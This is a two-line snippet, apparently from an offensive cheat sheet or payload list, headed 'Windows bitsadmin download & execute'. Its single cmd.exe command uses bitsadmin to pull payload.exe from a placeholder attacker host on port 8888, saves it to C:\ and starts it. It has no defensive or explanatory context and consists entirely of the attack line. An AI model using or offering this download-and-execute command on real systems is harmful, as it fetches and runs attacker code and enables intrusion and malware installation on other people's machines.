# Windows bitsadmin download & execute
cmd.exe /c "bitsadmin /transfer eviljob /download /priority high http://attacker-ip:8888/payload.exe c:\payload.exe & start c:\payload.exe"
